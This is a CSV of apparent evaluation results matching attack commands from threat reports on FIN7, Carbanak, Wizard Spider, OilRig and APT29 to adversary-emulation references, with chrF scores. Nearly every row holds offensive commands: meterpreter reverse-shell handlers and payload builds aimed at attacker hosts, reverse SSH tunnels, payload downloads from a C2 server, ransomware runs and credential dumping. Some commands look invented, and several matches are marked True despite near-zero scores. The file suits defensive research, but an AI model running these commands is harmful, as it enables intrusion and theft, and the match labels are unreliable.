report,file,tool,input_command,matched_command,chrf_score,match_found
CROWD_CARBANAK,command_metasploit_TA0002_T1059.txt,metasploit,"powershell.exe -nop -w hidden -c ""Start-Process -FilePath '<file_path>' -ArgumentList '<arguments>'""","`meterpreter > powershell_execute ""Find-LocalAdminAccess | Out-File C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\admin.txt""`","21,867",True
CROWD_CARBANAK,command_metasploit_TA0002_T1203.txt,metasploit,set PAYLOAD windows/meterpreter/reverse_tcp,[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,"56,249",True
CROWD_CARBANAK,command_paexec_TA0011_T1219.txt,paexec,paeexec.exe -s -i -u <user_name> -p <password> -c \\\\remote_system," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","29,269",True
CROWD_CARBANAK,command_plink_TA0008_T1021.txt,plink,plink.exe -no-antispoof -R 3389:localhost:3389 <victim_machine_ip>,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","43,232",True
CROWD_CARBANAK,command_psexec_TA0003_T1133.txt,psexec,psexec \\remote_system -u <username> -p <password> -r <service_name>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","24,544",True
CROWD_CARBANAK,command_psexec_TA0011_T1105.txt,psexec,"psexec \\<target_computer> -s -h -n 30 -u <attacker_username> -p <attacker_password> cmd /c ""copy C:\path\to\target_file.exe %appdata%\Microsoft\Windows\Downloaded Program Files""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","22,667",True
CROWD_CARBANAK,command_ryuk_TA0009_T1113.txt,ryuk,ryuk.exe -e,`ryuk.exe --encrypt --process-name notepad.exe`,"47,11",True
CROWD_CARBANAK,command_windows_credential_editor_TA0009_T1005.txt,windows credential editor,wce.exe /dump /ntlm,"```sh
wce.exe -w
```","30,054",True
CROWD_WIZARDSPIDER,command_chrome_passwords_TA0006_T1555.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","64,495",True
CROWD_WIZARDSPIDER,command_metasploit_TA0002_T1035.txt,metasploit,msfpayload windows/xp/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> > payload.exe,`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 -f exe-service -o javamtsup.exe`,"49,542",True
CROWD_WIZARDSPIDER,command_metasploit_TA0002_T1059.txt,metasploit,use auxiliary/scanner/smb/smb_login,"```sh
msf> use auxiliary/admin/smb/psexec_ntdsgrab
```","43,356",True
CROWD_WIZARDSPIDER,command_metasploit_TA0007_T1018.txt,metasploit,"plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389","```
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_https
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
    ```","21,815",True
CROWD_WIZARDSPIDER,command_metasploit_TA0007_T1057.txt,metasploit,code_factory.make_random_stub --type if_statement,[meterpreter\*] > `run post/windows/gather/credentials/credential_collector`,"16,116",True
CROWD_WIZARDSPIDER,command_metasploit_TA0007_T1082.txt,metasploit,use powershell mixin; payload_info; osinfo,`meterpreter > load powershell`,"28,341",True
CROWD_WIZARDSPIDER,command_metasploit_TA0011_T1071.txt,metasploit,use scanner/winrm/winrm_login,[meterpreter\*] > `run post/windows/gather/credentials/credential_collector`,"15,947",True
CROWD_WIZARDSPIDER,command_plink_TA0011_T1105.txt,plink,"plink.exe -i <private_key_file> -ssh user@192.168.0.4 -m ""<command_to_execute>""","`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","34,237",True
CROWD_WIZARDSPIDER,command_psexec_TA0001_T1078.txt,psexec,"psexec \\example.com -u adminuser -c C:\path\to\malware.exe -a 1,2 -f","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","20,86",True
CROWD_WIZARDSPIDER,command_psexec_TA0003_T1078.txt,psexec,psexec \\remote-system -e -u <new_user_name> -p <password> -w C:\directory,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","19,998",True
CROWD_WIZARDSPIDER,command_psexec_TA0004_T1078.txt,psexec,psexec -e -f -i -n <timeout_seconds> -u <existing_user_name> -w C:\path\to\directory //remote-system,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","19,168",True
CROWD_WIZARDSPIDER,command_psexec_TA0005_T1078.txt,psexec,psexec \\remote_system -u Domain\Username -p <password> -l,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","23,994",True
CROWD_WIZARDSPIDER,command_psexec_TA0006_T1003.txt,psexec,"psexec -i -u <Domain\User> -p <password> cmd /c ""whoami""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","18,626",True
CROWD_WIZARDSPIDER,command_psexec_TA0008_T1021.txt,psexec,"psexec \\* -u <attacker_username> -c ""<path_to_Ryuk_binary>""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","20,481",True
CROWD_WIZARDSPIDER,command_ryuk_TA0004_T1055.txt,ryuk,ryuk.exe -p <process_name>,`ryuk.exe --encrypt --process-name notepad.exe`,"49,836",True
CROWD_WIZARDSPIDER,command_ryuk_TA0005_T1055.txt,ryuk,ryuk.exe --process-name <target_process_name>,`ryuk.exe --encrypt --process-name notepad.exe`,"49,49",True
CYWARE_FIN6,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","59,855",True
CYWARE_FIN6,command_metasploit_TA0002_T1129.txt,metasploit,"msfconsole -x ""use exploit/windows/local/payload_inject; set PAYLOAD=windows/x64/meterpreter/reverse_tcp; set LHOST=<attacker_IP>; set LPORT=<attacker_port>; exploit""","```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
```","40,544",True
CYWARE_FIN6,command_metasploit_TA0003_T1543.txt,metasploit,"msfdb -n ""Windows_Service"" -o ""mof"" upload <mof_file>",`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 -f exe-service -o javamtsup.exe`,"19,228",True
CYWARE_FIN6,command_metasploit_TA0004_T1543.txt,metasploit,msfdb --component db_connect -n <name> -u your_current_account_name -p super_secret_password -t super_secret_api_token,"```
    use post/windows/manage/run_as
    set CMD ""netsh advfirewall firewall add rule name='Service Host' dir=in action=allow protocol=TCP localport=5900""
    set DOMAIN <domain_full>
    set PASSWORD <domain_admin_password>
    set USER <domain_admin>
    set SESSION 3
    exploit
    ```","18,207",True
CYWARE_FIN6,command_plink_TA0011_T1105.txt,plink,plink -share <c2_server>,"```sh
plink -ssh #{user}@#{server}
```","38,294",True
CYWARE_FIN6,command_psexec_TA0008_T1021.txt,psexec,psexec -u <remote_username> -p <password> -r <remote_service_name>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","23,722",True
CYWARE_FIN6,command_ryuk_TA0005_T1055.txt,ryuk,ryuk.exe --inject-lockergoga,`ryuk.exe --encrypt --process-name notepad.exe`,"33,776",True
CYWARE_OILRIG,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","64,495",True
CYWARE_OILRIG,command_metasploit_TA0011_T1071.txt,metasploit,use meterpreter/dns,`meterpreter> getsystem -t 1`,"52,659",True
CYWARE_OILRIG,command_paexec_TA0003_T1505.txt,paexec,paexec -i -c <web_server_script_name>.bat," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","15,972",True
CYWARE_OILRIG,command_plink_TA0001_T1071.txt,plink,plink.exe -share <session_name>,`plink.exe <domain_admin>@<bankfileserver_ip>`,"31,53",True
CYWARE_OILRIG,command_pupy_TA0001_T1078.txt,pupy,creddump,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`","6,33",True
CYWARE_OILRIG,command_pupy_TA0003_T1078.txt,pupy,run Lazagne,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`","6,349",True
CYWARE_OILRIG,command_pupy_TA0004_T1078.txt,pupy,lazagne -o db -p <local_db_path>,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"10,642",True
CYWARE_OILRIG,command_pupy_TA0005_T1078.txt,pupy,laze -s,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"4,125",True
DEEPWATCH_FIN7,command_windows_credential_editor_TA0006_T1003.txt,windows credential editor,wce -s <username>:<domain>:<hash>[:<ntlm_hash>],"```sh
wce.exe -w
```","5,566",True
DIVE_WIZARDSPIDER,command_chrome_passwords_TA0003_T1078.txt,chrome passwords,chrome-passwords -p <stolen_credentials>,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","39,827",True
DIVE_WIZARDSPIDER,command_chrome_passwords_TA0005_T1078.txt,chrome passwords,chrome-passwords -p <stolen_credentials>,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","39,827",True
DIVE_WIZARDSPIDER,command_ryuk_TA0002_T1059.txt,ryuk,ryuk.exe --drop-bat-files,`ryuk.exe --encrypt --process-name notepad.exe`,"36,908",True
DIVE_WIZARDSPIDER,command_windows_credential_editor_TA0006_T1003.txt,windows credential editor,wce -w,"```sh
wce.exe -w
```","33,601",True
DOJ_FIN7,command_plink_TA0011_T1071.txt,plink,plink.exe -no-sanitise-stdout -no-antispoof <attacker_ssh_user>@<command_and_control_server_IP>,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","34,827",True
DOJ_FIN7,command_pupy_TA0001_T1078.txt,pupy,lazagne,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"5,598",True
DOJ_FIN7,command_pupy_TA0003_T1078.txt,pupy,loot_memory -b <browser_password>,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`","12,714",True
DOJ_FIN7,command_pupy_TA0004_T1078.txt,pupy,lazagne --all,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"7,39",True
DOJ_FIN7,command_pupy_TA0005_T1078.txt,pupy,loot_memory -b <browser_name>,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`","17,306",True
DOJ_FIN7,command_windows_credential_editor_TA0009_T1005.txt,windows credential editor,wce -k MYDOMAIN -t <TGT_ticket> -s <Session_Key>,"```sh
wce.exe -w
```","5,018",True
DUKES_APT29,command_metasploit_TA0002_T1059.txt,metasploit,powershell.exe -ExecutionPolicy Bypass -File <script_file_path>,"`meterpreter > powershell_execute ""Find-LocalAdminAccess | Out-File C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\admin.txt""`","24,725",True
DUKES_APT29,command_metasploit_TA0010_T1041.txt,metasploit,recon/gather/credentials collect_creds,[meterpreter\*] > `run post/windows/gather/credentials/credential_collector`,"57,01",True
DUKES_APT29,command_metasploit_TA0011_T1071.txt,metasploit,msfconsole -x 'use exploit/multi/http/download_exec; set PAYLOAD windows/meterpreter/reverse_http; set RHOST <c2_server_ip>; set RPORT 8080; exploit',"```
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_https
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
    ```","45,662",True
DUKES_APT29,command_metasploit_TA0011_T1102.txt,metasploit,curl -o <served_payload_file> https://<c2_server>/linux/x64/meterpreter/reverse_tcp,"```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
```","40,354",True
DUKES_APT29,command_psexec_TA0002_T1569.txt,psexec,"psexec -s -a 1,2 -c ""C:\Path\To\MaliciousExecutable.exe"" -d","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","20,182",True
DUKES_APT29,command_psexec_TA0008_T1021.txt,psexec,psexec \\<target_computer_name> -u <username> -p <password> cmd.exe,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","25,646",True
FIREEYE1_CARBANAK,command_chrome_passwords_TA0005_T1027.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","59,855",True
FIREEYE1_CARBANAK,command_chrome_passwords_TA0009_T1056.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","64,495",True
FIREEYE1_CARBANAK,command_paexec_TA0002_T1204.txt,paexec,"PAExec -program ""<malicious_file_path>"""," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","13,231",True
FIREEYE1_CARBANAK,command_paexec_TA0011_T1021.txt,paexec,paeexec -c -u <victims_username> -p <attacker_password> -w %windir% -i," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","25,201",True
FIREEYE1_CARBANAK,command_paexec_TA0011_T1219.txt,paexec,paexec.exe -s -u <user_name> -p <password> -i," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","36,42",True
FIREEYE1_CARBANAK,command_ryuk_TA0005_T1055.txt,ryuk,'ryuk.exe --process-name notepad.exe',`ryuk.exe --encrypt --process-name notepad.exe`,"85,814",True
FIREEYE1_CARBANAK,command_ryuk_TA0006_T1055.txt,ryuk,ryuk.exe --encrypt,`ryuk.exe --encrypt --process-name notepad.exe`,"72,768",True
FIREEYE1_CARBANAK,command_ryuk_TA0009_T1113.txt,ryuk,ryuk.exe /capture-desktop,`ryuk.exe --encrypt --process-name notepad.exe`,"30,813",True
FIREEYE1_FIN7,command_plink_TA0011_T1071.txt,plink,plink.exe -C -i <private_key_file> <c2_server_ip>,`plink.exe <domain_admin>@<bankfileserver_ip>`,"39,423",True
FIREEYE2_FIN7,command_adfind_TA0002_T1204.txt,adfind,adfind -jsd xxx -ntsecuritydescriptor -sddl++ -resolvesids <LNK_file_path>,`adfind.exe -f (objectcategory=person) > ad_users.txt`,"15,178",True
FIREEYE3_FIN7,command_chrome_passwords_TA0002_T1204.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","64,495",True
FIREEYE3_FIN7,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,Invoke-PSImage -Embed -InputFile <image_file> -OutputFile <output_png>,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"30,208",True
FIREEYE3_FIN7,command_metasploit_TA0002_T1059.txt,metasploit,"msfconsole -q; irb; require 'msf/core/exploitation'; require 'msf/util/powershell'; js = ::Rex::Exploitation::JSObfu.new %Q|eval('eval(String.fromCharCode(98,111,100));');|; js.obfuscate","```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
```","15,715",True
FIREEYE4_FIN7,command_chrome_passwords_TA0006_T1056.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","64,495",True
FIREEYE4_FIN7,command_chrome_passwords_TA0009_T1056.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","64,495",True
FIREEYE4_FIN7,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,Command:,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"4,758",True
FIREEYE4_FIN7,command_plink_TA0008_T1021.txt,plink,plink.exe -load sessname -X -v -R <vnc_port>:localhost:<vnc_port> <attacker_ssh_user>@<target_host>,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","42,943",True
FIREEYE4_FIN7,command_rubeus_TA0009_T1113.txt,rubeus,rubeus logonsession /screenshot,`rubeus.exe kerberoast /domain:oz.local`,"20,723",True
FIREEYE4_FIN7,command_ryuk_TA0004_T1055.txt,ryuk,ryuk.exe /inject <target_process_name>,`ryuk.exe --encrypt --process-name notepad.exe`,"36,186",True
FIREEYE4_FIN7,command_ryuk_TA0005_T1055.txt,ryuk,ryuk.exe --inject <process_name>,`ryuk.exe --encrypt --process-name notepad.exe`,"46,374",True
FIREEYE5_FIN7,command_adfind_TA0003_T1546.txt,adfind,"adfind -sc adobjcnt:fsp -base CN=Foreign Security Principals,CN=Schema,CN=Configuration",`adfind.exe -f (objectcategory=organizationalUnit) > ad_ous.txt`,"17,117",True
FIREEYE5_FIN7,command_adfind_TA0004_T1546.txt,adfind,"adfind -b CN=Application Shim Database,CN=Schema,CN=Configuration,DC=example,DC=com -ds -showdel",`adfind.exe -f (objectcategory=organizationalUnit) > ad_ous.txt`,"14,234",True
FIREEYE5_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords.exe -c > shim_database_file.sdb,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","42,096",True
FIREEYE5_FIN7,command_invoke_psimage_TA0002_T1106.txt,invoke psimage,Invoke-PSImage -ScriptBlock {RtlDecompressBuffer} -OutputFile,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"39,425",True
FIREEYE5_FIN7,command_invoke_psimage_TA0003_T1543.txt,invoke psimage,Invoke-PSImage -Script <malicious_payload_script> -Out <new_image_file>.png -WebRequest,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"34,39",True
FIREEYE5_FIN7,command_invoke_psimage_TA0004_T1543.txt,invoke psimage,Invoke-PSImage -Script .\T1543.ps1 -Out .\system-process.ps1 -WebRequest,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"46,78",True
FIREEYE5_FIN7,command_pupy_TA0004_T1055.txt,pupy,gen -f client -O windows -A x64 connect --host <ip>:<port> -t transport,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"58,531",True
FIREEYE5_FIN7,command_pupy_TA0005_T1055.txt,pupy,gen -f dll connect --host <target_ip>:<port> -t <transport>,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"27,894",True
FIREEYE6_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","59,855",True
FIREEYE6_FIN7,command_invoke_psimage_TA0003_T1547.txt,invoke psimage,Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\startup.exe -Startup,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"47,016",True
FIREEYE6_FIN7,command_invoke_psimage_TA0004_T1547.txt,invoke psimage,Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\startup.png -Image .\kiwi.jpg -Startup,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"52,075",True
FIREEYE6_FIN7,command_wmic_TA0007_T1057.txt,wmic,wmic path win32_process get name,"`wmic /node:#{""POS system""} process call create #{""executable""}`","23,52",True
FIREEYE6_FIN7,command_wmic_TA0009_T1018.txt,wmic,"wmic path win32_process get processid, name, executablepath /value","`wmic /node:#{""POS system""} process call create #{""executable""}`","29,713",True
FIREEYE6_FIN7,command_wmic_TA0009_T1082.txt,wmic,wmic process list /output:XML > process_output.xml,"`wmic /node:#{""POS system""} process call create #{""executable""}`","19,744",True
FORCEPOINT_CARBANAK,command_chrome_passwords_TA0011_T1102.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","59,855",True
FORCEPOINT_CARBANAK,command_plink_TA0002_T1071.txt,plink,"plink.exe -load mysession -o ""POST /path/to/web/protocol"" -v","`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","20,757",True
FORCEPOINT_CARBANAK,command_plink_TA0011_T1071.txt,plink,"plink.exe mysession echo ""GET / HTTP/1.1"" -batch",`plink.exe <domain_admin>@<bankfileserver_ip>`,"20,78",True
FORCEPOINT_CARBANAK,command_plink_TA0011_T1105.txt,plink,plink -batch -ssh ggldr@<google_service_url>,"```sh
plink -ssh #{user}@#{server}
```","20,408",True
FORK_APT29,command_chrome_passwords_TA0009_T1114.txt,chrome passwords,chrome-passwords -p <file_path_to_chrome_user_data>,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","33,482",True
